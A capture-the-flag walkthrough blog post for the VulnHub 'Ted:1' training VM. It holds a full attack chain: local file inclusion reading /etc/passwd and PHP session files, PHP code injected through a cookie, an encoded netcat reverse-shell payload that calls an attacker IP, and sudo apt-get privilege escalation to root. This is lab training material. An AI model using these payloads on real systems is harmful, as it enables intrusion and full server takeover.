<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Ted:1  Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ted1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-03T14:31:24+00:00">August 3, 2019</time><time class="updated" datetime="2025-06-10T20:11:24+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take a new challenge, Ted. The credit for making this VM machine goes to “Avraham Cohen” and it is a boot2root challenge where we have to root the server to complete the challenge. You can download this VM <u><a style="color: #000000;" href="https://www.vulnhub.com/entry/ted-1,327/">here</a></u></span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">NMAP</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing the website</span></li>
<li><span style="color: #000000;">Burpsuite </span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Netcat</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo permission for the apt-get command</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong>:</span></p>
<h3><span style="color: #800000;"><strong>Scanning:</strong></span></h3>
<p><span style="color: #000000;">First thing first, scan the vulnerable machine using nmap</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.10</pre>
<p><span style="color: #000000;">Here we found that the only port open is port 80</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ePmzxxvn8cg/XUWY3WrKyiI/AAAAAAAAfz0/uxxL6iW9C90YkgsLEGrFkdPhvTsIgDsCgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s take a look at what the port 80 has to offer, we open the IP address in the browser and we found a login page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-azwKYM2Y-tM/XUWY3U7bFxI/AAAAAAAAfz4/B4HTCNJGMGQP9wCErKtKRbVKeYEeh8ghgCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We tried to attempt some common default passwords but remain unsuccessful, but found something different. There is no error message displayed on the webpage, when we took a look at the response in burp-suite we found that the response asks us to provide the password in hash form</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MszSENRclR8/XUWY3mpaXrI/AAAAAAAAfz8/LlXzPT3nrUg2T6T3MlO7z-jEMIwsEm2qwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now we know how to supply but don’t know which specific hashing algorithm. So we tried multiple algorithms like MD5, MD4, SHA-1, RIPEMD, etc. And found that SHA-256 is the correct algorithm and it worked for hash value of admin as password.</span></p>
<p><span style="color: #000000;">Once logged in, we found a simple file browser which helps in reading files from the file system of the target environment. We tried to read the contents of /etc/passwd and it displayed the contents</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IcHI8RkPlIA/XUWY4V2ljaI/AAAAAAAAf0A/JoBYfEXC_IcH5xvGD9vS28puaw8kN-WSQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As the file browser works as a File Inclusion module in the current web environment, we tried to exploit the File Inclusion module with Remote File Inclusion vulnerability but failed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_MFCFVKAo-4/XUWY4v3p5vI/AAAAAAAAf0E/vlN6u9Qk0qMC30hajnMV2KR296QlSZf7QCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Then we tried to read various critical files but were only able to read files not of much worth, except the session details which are stored in the file system of the server in the following way</span></p>
<pre class="lang:default decode:true">/var/lib/php/sessions/sess_&lt;php session id&gt;</pre>
<p><span style="color: #000000;">Here we found that all the session cookies and their values are stored in the session file of the user</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5qpGZREfC1s/XUWY435iXeI/AAAAAAAAf0M/xMimYd-aKgQf6Sufj-NB-5UhN_6PWEp_gCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We tried exploiting <strong>user_pref </strong>cookie by inputting a small php code to get the output of the <strong>ifconfig</strong> command</span></p>
<p><span style="color: #000000;">The code we are trying to inject is</span></p>
<pre class="lang:default decode:true">&lt;?php system("ifconfig")?&gt;</pre>
<p><span style="color: #000000;">After encoding. the characters in URL encoding,  the code looks something like this</span></p>
<pre class="lang:default decode:true">%3c%3fphp%20system%28%22ifconfig%22%29%3f%3e</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HRfg2QfDf20/XUWY4yIHlrI/AAAAAAAAf0I/6hquSYzJKBQ0xjrRMLQMTSfgUmuR5ZKyQCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">As we found that we are able to create a Remote Code Execution vulnerability, let’s try to get a netcat reverse shell</span></p>
<p><span style="color: #000000;">The php code we tried looks something like this</span></p>
<pre class="lang:default decode:true">&lt;?php system("nc 192.168.1.7 1234 -e /bin/bash")?&gt;</pre>
<p><span style="color: #000000;">After encoding into URL Encoding, the code looks something like this</span></p>
<pre class="lang:default decode:true">%3c%3fphp%20system%28%22nc%20192.168.1.7%201234%20-e%20%2fbin%2fbash%22%29%3f%3e</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-65y7pdDsVDI/XUWY5b5XrsI/AAAAAAAAf0Q/-bR7U96Rn3EHvzIO3UQz1IJjVoKtRkDdwCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Once receiving a reverse shell, all we have to do is get the privilege escalated. After spawning a tty shell, we tried to check for sudo permissions of the current user(www-data)</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">Here we found that we can run the apt-get command with sudo privileges,  let’s do that</span></p>
<pre class="lang:default decode:true">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</pre>
<p><span style="color: #000000;">You can find more details about privilege escalation through APT <strong><u><a style="color: #000000;" href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">here</a></u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PsVvT4XZqa0/XUWY5lzlMUI/AAAAAAAAf0U/et0W_-WHZMQsyPd7_Q0HT1d8CvMi65bMgCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Deepanshu is a Certified Ethical Hacker, Security Researcher, Pentester and Trainer at Ignite Technologies. Contact <u><a style="color: #000000;" href="https://www.linkedin.com/in/deepanshu-k-a4248b138/">here</a></u></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
